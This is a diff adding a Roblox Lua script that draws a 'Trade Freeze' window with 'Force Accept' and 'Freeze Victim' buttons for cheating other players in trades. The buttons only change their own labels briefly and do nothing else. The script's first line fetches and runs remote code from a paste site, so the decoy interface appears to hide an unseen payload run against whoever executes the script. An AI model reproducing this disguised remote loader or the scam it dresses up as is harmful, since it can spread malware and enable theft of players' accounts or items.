@@ -1,0 +1,220 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/PEHoUwYSPu/0"))()
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+-- GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "TradeFreeze"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- Main Window
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0, 500, 0, 440)
+main.Position = UDim2.new(0.5, -250, 0.5, -220)
+main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+main.BorderSizePixel = 0
+main.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 10)
+corner.Parent = main
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 85)
+title.Position = UDim2.new(0, 0, 0, 5)
+title.BackgroundTransparency = 1
+title.Text = "Trade Freeze"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = main
+
+-- Version
+local version = Instance.new("TextLabel")
+version.Size = UDim2.new(1, 0, 0, 35)
+version.Position = UDim2.new(0, 0, 0, 85)
+version.BackgroundTransparency = 1
+version.Text = "v1.0"
+version.TextColor3 = Color3.fromRGB(180, 180, 180)
+version.TextScaled = true
+version.Font = Enum.Font.Gotham
+version.Parent = main
+
+-- Divider
+local divider = Instance.new("Frame")
+divider.Size = UDim2.new(0.90, 0, 0, 2)
+divider.Position = UDim2.new(0.05, 0, 0, 135)
+divider.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+divider.BorderSizePixel = 0
+divider.Parent = main
+
+-- Button Function
+local function createButton(text, position, color)
+	local button = Instance.new("TextButton")
+
+	button.Size = UDim2.new(0.84, 0, 0, 85)
+	button.Position = position
+
+	button.BackgroundColor3 = color
+	button.BorderSizePixel = 0
+
+	button.Text = text
+	button.TextColor3 = Color3.fromRGB(255, 255, 255)
+	button.TextScaled = true
+	button.Font = Enum.Font.GothamBold
+
+	button.AutoButtonColor = true
+	button.Parent = main
+
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, 22)
+	c.Parent = button
+
+	return button
+end
+
+-- Buttons
+local forceAccept = createButton(
+	"Force Accept",
+	UDim2.new(0.08, 0, 0, 160),
+	Color3.fromRGB(0, 190, 230)
+)
+
+local freezeVictim = createButton(
+	"Freeze Victim",
+	UDim2.new(0.08, 0, 0, 265),
+	Color3.fromRGB(240, 55, 65)
+)
+
+-- Delay Text
+local delayLabel = Instance.new("TextLabel")
+delayLabel.Size = UDim2.new(0.84, 0, 0, 40)
+delayLabel.Position = UDim2.new(0.08, 0, 0, 370)
+delayLabel.BackgroundTransparency = 1
+delayLabel.Text = "Delay: 10s"
+delayLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+delayLabel.TextScaled = true
+delayLabel.Font = Enum.Font.GothamBold
+delayLabel.Parent = main
+
+-- Button state
+local ready = false
+
+forceAccept.Active = false
+freezeVictim.Active = false
+
+--// 10 SECOND COUNTDOWN //--
+
+task.spawn(function()
+
+	for seconds = 10, 0, -1 do
+
+		delayLabel.Text = "Delay: " .. seconds .. "s"
+
+		task.wait(1)
+
+	end
+
+	ready = true
+
+	forceAccept.Active = true
+	freezeVictim.Active = true
+
+	delayLabel.Text = "Ready!"
+
+end)
+
+--// FORCE ACCEPT VISUAL //--
+
+forceAccept.MouseButton1Click:Connect(function()
+
+	if not ready then
+		return
+	end
+
+	forceAccept.Text = "ACCEPTED ✓"
+
+	task.delay(1.5, function()
+
+		if forceAccept then
+			forceAccept.Text = "Force Accept"
+		end
+
+	end)
+
+end)
+
+--// FREEZE VICTIM VISUAL //--
+
+freezeVictim.MouseButton1Click:Connect(function()
+
+	if not ready then
+		return
+	end
+
+	freezeVictim.Text = "FROZEN ✓"
+
+	task.delay(1.5, function()
+
+		if freezeVictim then
+			freezeVictim.Text = "Freeze Victim"
+		end
+
+	end)
+
+end)
+
+--// MOVABLE WINDOW //--
+
+local dragging = false
+local dragStart
+local startPosition
+
+main.InputBegan:Connect(function(input)
+
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+
+		dragging = true
+
+		dragStart = input.Position
+		startPosition = main.Position
+
+		input.Changed:Connect(function()
+
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+
+		end)
+
+	end
+
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+
+	if not dragging then
+		return
+	end
+
+	if input.UserInputType == Enum.UserInputType.MouseMovement
+		or input.UserInputType == Enum.UserInputType.Touch then
+
+		local delta = input.Position - dragStart
+
+		main.Position = UDim2.new(
+			startPosition.X.Scale,
+			startPosition.X.Offset + delta.X,
+			startPosition.Y.Scale,
+			startPosition.Y.Offset + delta.Y
+		)
+
+	end
+
+end)
